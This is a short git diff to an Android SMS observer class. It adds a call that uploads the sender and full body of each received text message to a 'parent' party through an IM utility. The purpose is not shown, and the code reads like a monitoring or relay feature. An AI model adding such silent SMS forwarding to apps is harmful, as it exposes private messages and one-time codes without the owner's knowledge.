@@ -8,6 +8,8 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 
+import com.openim.tophone.openim.IMUtil;
+
 public class SmsContentObserver extends ContentObserver {
     private Context mContext;
 
@@ -36,6 +38,8 @@ public class SmsContentObserver extends ContentObserver {
                 L.d(TAG, "Received SMS from: " + sender + ", Message: " + messageBody);
                 // 处理短信逻辑
                 lastProcessedSmsId = currentSmsId;
+
+                IMUtil.uploadMsg2Parent("receive_sms",sender,messageBody);
             }
             cursor.close();
         }
